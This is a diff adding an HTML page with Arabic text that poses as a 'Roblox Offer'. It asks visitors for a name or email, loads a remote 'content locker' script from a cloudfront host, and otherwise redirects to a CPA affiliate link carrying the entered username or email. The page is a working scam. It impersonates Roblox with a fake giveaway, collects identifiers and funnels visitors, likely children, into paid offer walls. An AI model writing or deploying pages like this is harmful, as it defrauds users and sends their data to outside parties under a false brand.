@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Roblox Offer</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #7a3eff, #4a00e0);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .card {
+      background: #fff;
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+      max-width: 400px;
+      width: 90%;
+      text-align: center;
+    }
+
+    /* 🔥 هذا هو النص مكان اللوغو */
+    .logo {
+      font-size: 32px;
+      font-weight: 900;
+      letter-spacing: 2px;
+      color: #7a3eff;
+      margin-bottom: 20px;
+      text-transform: uppercase;
+    }
+
+    .card h1 {
+      font-size: 24px;
+      margin-bottom: 8px;
+      color: #333;
+    }
+
+    .card h2 {
+      font-size: 15px;
+      font-weight: 400;
+      color: #777;
+      margin-bottom: 25px;
+    }
+
+    .input-box {
+      display: flex;
+      align-items: center;
+      margin-bottom: 20px;
+      border: 2px solid #eee;
+      border-radius: 12px;
+      padding: 10px;
+      transition: 0.3s;
+    }
+
+    .input-box:hover {
+      border-color: #7a3eff;
+    }
+
+    .input-box input {
+      border: none;
+      outline: none;
+      flex: 1;
+      font-size: 16px;
+    }
+
+    /* 🔥 المنصات بدل الإيموجي */
+    .platforms {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 12px;
+      margin-bottom: 25px;
+    }
+
+    .platforms button {
+      background: #f2f2f2;
+      border: none;
+      border-radius: 12px;
+      padding: 12px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      font-size: 15px;
+      font-weight: bold;
+      color: #333;
+    }
+
+    .platforms button:hover {
+      background: #d8c7ff;
+      transform: scale(1.05);
+      color: #4a00e0;
+    }
+
+    .btn {
+      background: linear-gradient(135deg, #7a3eff, #4a00e0);
+      color: #fff;
+      font-size: 18px;
+      font-weight: bold;
+      padding: 15px;
+      width: 100%;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    .btn:hover {
+      transform: scale(1.05);
+      background: linear-gradient(135deg, #5a2bcc, #2e007a);
+    }
+
+    @media (max-width: 480px) {
+      .card {
+        padding: 20px;
+      }
+      .logo {
+        font-size: 26px;
+      }
+      .card h1 {
+        font-size: 20px;
+      }
+      .platforms {
+        grid-template-columns: 1fr;
+      }
+    }
+  </style>
+
+  <!-- 🔒 كود الكونتنت لوكر -->
+  <script type="text/javascript">
+    var mSDIi_ZdS_URdgbc = {"it":4197555,"key":"00006"};
+  </script>
+  <script src="https://dlk457skl57zp.cloudfront.net/99b38b4.js"></script>
+</head>
+<body>
+  <div class="card">
+    <!-- هذا هو مكان اللوغو -->
+    <div class="logo">ROBLOX</div>
+
+    <h1>مرحبا بك 👋</h1>
+    <h2>أدخل اسمك واكمل للحصول على العرض</h2>
+
+    <div class="input-box">
+      <input type="text" id="username" placeholder="أدخل اسمك أو الإيميل">
+    </div>
+
+    <!-- هادو هما الأزرار ديال المنصات -->
+    <div class="platforms">
+      <button>Windows</button>
+      <button>Xbox</button>
+      <button>Android</button>
+      <button>iOS</button>
+    </div>
+
+    <button class="btn" onclick="openLocker()">استمر</button>
+  </div>
+
+  <!-- 📌 مكان الكونتنت لوكر -->
+  <div id="lockerContainer"></div>
+
+  <script>
+    function openLocker() {
+      let username = document.getElementById("username").value;
+      if(username.trim() === ""){
+        alert("من فضلك أدخل اسمك أو الإيميل");
+        return;
+      }
+      // ✅ استدعاء اللوكر
+      if (typeof _tx === "function") {
+        _tx(); 
+      } else {
+        // fallback: رابط CPA لو ما اشتغلش اللوكر
+        window.location.href = "https://smrturl.co/ccfa87d?user=" + encodeURIComponent(username);
+      }
+    }
+  </script>
+</body>
+</html>
